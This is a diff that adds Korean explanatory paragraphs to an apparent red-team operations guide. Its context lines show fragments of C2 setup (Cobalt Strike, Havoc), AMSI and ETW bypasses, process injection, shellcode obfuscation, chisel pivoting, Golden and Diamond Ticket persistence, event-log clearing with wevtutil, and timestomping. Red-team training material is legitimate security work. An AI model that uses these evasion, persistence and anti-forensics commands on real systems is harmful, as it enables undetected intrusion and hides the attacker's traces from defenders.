@@ -92,6 +92,9 @@
 
 ### 팀 서버 설정
 
+
+Cobalt Strike는 전문 레드팀 시뮬레이션 도구로, Beacon C2 에이전트를 통해 타겟 시스템을 원격 제어합니다. HTTP/HTTPS/DNS 등 다양한 채널로 C2 통신을 우회하며, 실제 APT 공격 시뮬레이션에 사용됩니다.
+
 ```bash
 # Cobalt Strike 팀 서버 시작
 ./teamserver SERVER_IP STRONG_PASSWORD malleable_profile.c2
@@ -167,6 +170,8 @@ set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
 
 ### Cobalt Strike 핵심 명령어
 
+Cobalt Strike C2 프레임워크의 핵심 명령어입니다. 비콘 관리, 측면 이동, 자격증명 수집 등 레드팀 작전의 모든 단계를 지원합니다.
+
 ```bash
 # 비콘 관리
 beacon> help                    # 도움말
@@ -211,6 +216,8 @@ beacon> covertvpn               # VPN 피벗
 
 ## 3. Havoc C2 프레임워크 (오픈소스)
 
+Havoc는 오픈소스 C2 프레임워크입니다. Cobalt Strike의 오픈소스 대안으로 팀 서버와 에이전트 간 암호화 통신을 제공합니다.
+
 ```bash
 # Havoc 설치
 git clone https://github.com/HavocFramework/Havoc
@@ -254,6 +261,8 @@ Listeners {
 
 ### AMSI (Anti-Malware Scan Interface) 우회
 
+AMSI(Anti-Malware Scan Interface) 우회 기법입니다. PowerShell 스크립트가 실행 전에 AMSI로 검사되는 것을 Reflection 기반으로 패치하여 우회합니다.
+
 ```powershell
 # AMSI 패치 (Reflection 기반)
 $a=[Ref].Assembly.GetTypes()
@@ -273,6 +282,8 @@ $g=$f.GetValue($null)
 ```
 
 ### ETW (Event Tracing for Windows) 우회
+
+ETW(Event Tracing for Windows) 비활성화 코드입니다. ETW는 프로세스 활동을 기록하므로 탐지 회피를 위해 악성코드가 비활성화를 시도합니다.
 
 ```csharp
 // ETW 비활성화 (프로세스 내)
@@ -295,6 +306,8 @@ NtSetInformationProcess(
 ```
 
 ### 프로세스 인젝션 기법
+
+고전적인 프로세스 인젝션 기법입니다. VirtualAllocEx로 원격 프로세스에 메모리를 할당하고 WriteProcessMemory로 셸코드를 주입합니다.
 
 ```csharp
 // 고전적: VirtualAllocEx + WriteProcessMemory
@@ -319,6 +332,8 @@ NtSetInformationProcess(
 ```
 
 ### Shellcode 난독화
+
+셸코드를 난독화하여 AV/EDR 탐지를 우회합니다. XOR 암호화, Base64 인코딩, 커스텀 인코딩으로 시그니처 기반 탐지를 피합니다.
 
 ```python
 #!/usr/bin/env python3
@@ -487,6 +502,8 @@ if __name__ == "__main__":
 
 ### SOCKS 프록시를 통한 피벗
 
+chisel 도구로 SOCKS 프록시 터널을 구성하여 피벗합니다. 내부 네트워크의 비공개 서비스에 외부에서 접근하기 위해 사용합니다.
+
 ```bash
 # ── chisel SOCKS 터널 ──────────────────────────────────────
 # 공격자 서버 (리버스 SOCKS5)
@@ -546,6 +563,8 @@ sudo ip route add 192.168.10.0/24 dev ligolo
 
 ### 더블 피벗 (두 단계 중간 시스템)
 
+두 단계의 중간 시스템을 거치는 다중 피벗 기법입니다. 격리된 내부 세그먼트에 접근하거나 공격 경로를 추적하기 어렵게 만듭니다.
+
 ```bash
 # 인터넷 → 에지 서버 → 내부 서버 → 격리 서버
 # 공격자 → Pivot1 → Pivot2 → Target
@@ -567,6 +586,8 @@ proxychains nmap -sT INTERNAL_NETWORK/24
 ## 6. 도메인 지속성
 
 ### Golden Ticket
+
+krbtgt 계정 해시로 골든 티켓을 생성하여 도메인 내 모든 서비스에 접근합니다. 도메인 컨트롤러 완전 장악 후 지속성 확보에 사용됩니다.
 
 ```bash
 # 1. krbtgt 해시 획득
@@ -594,6 +615,8 @@ dir \\DC01\C$  # DC 파일 시스템 접근
 ```
 
 ### Diamond Ticket (탐지 우회 개선)
+
+다이아몬드 티켓은 합법적인 TGT를 수정하는 방식으로 골든 티켓보다 탐지가 어렵습니다. 정상적인 Kerberos 교환을 기반으로 하여 이상 탐지를 우회합니다.
 
 ```bash
 # Rubeus Diamond Ticket 생성 (합법적 TGT + 수정)
@@ -643,6 +666,9 @@ Rubeus.exe diamond \
 ```
 
 ### 주요 기법별 탐지 회피 전략
+
+MITRE ATT&CK 기법별 탐지 회피 전략입니다. PowerShell, WMI, 서비스 등 주요 공격 기술에 대한 우회 방법을 다룹니다.
+
 ```bash
 # T1059.001 PowerShell 탐지 우회
 # AMSI 우회 + ETW 비활성화 후 실행
@@ -665,6 +691,8 @@ wevtutil cl Application
 ---
 
 ## 8. 레드팀 보고서 구조
+
+레드팀 운영 결과를 전달하는 최종 보고서 구조입니다. 경영진 요약, 기술적 발견사항, 위험도 평가, 개선 권고안을 포함합니다.
 
 ```markdown
 # 레드팀 최종 보고서
@@ -773,6 +801,9 @@ Baiting (미끼):
 ```
 
 ### 도메인 프론팅 및 CDN 악용
+
+도메인 프론팅으로 C2 통신을 CDN 뒤에 숨깁니다. 합법적인 도메인을 앞에 내세워 네트워크 탐지를 우회하지만 현재 대부분의 CDN에서 차단됩니다.
+
 ```bash
 # CloudFront 도메인 프론팅 (현재 대부분 차단됨)
 # 대안: CDN 제공사의 합법적 도메인 뒤에 C2 숨기기
@@ -787,6 +818,9 @@ curl "https://www.virustotal.com/vtapi/v2/domain/report?domain=DOMAIN&apikey=API
 ```
 
 ### 흔적 최소화
+
+작전 종료 후 공격 흔적을 지우는 방법입니다. 타임스탬프 조작, 로그 삭제, 도구 제거 등으로 사후 포렌식 분석을 어렵게 합니다.
+
 ```bash
 # 타임스탬프 조작
 touch -t 202001010000 malicious.exe    # 타임스탬프 변경
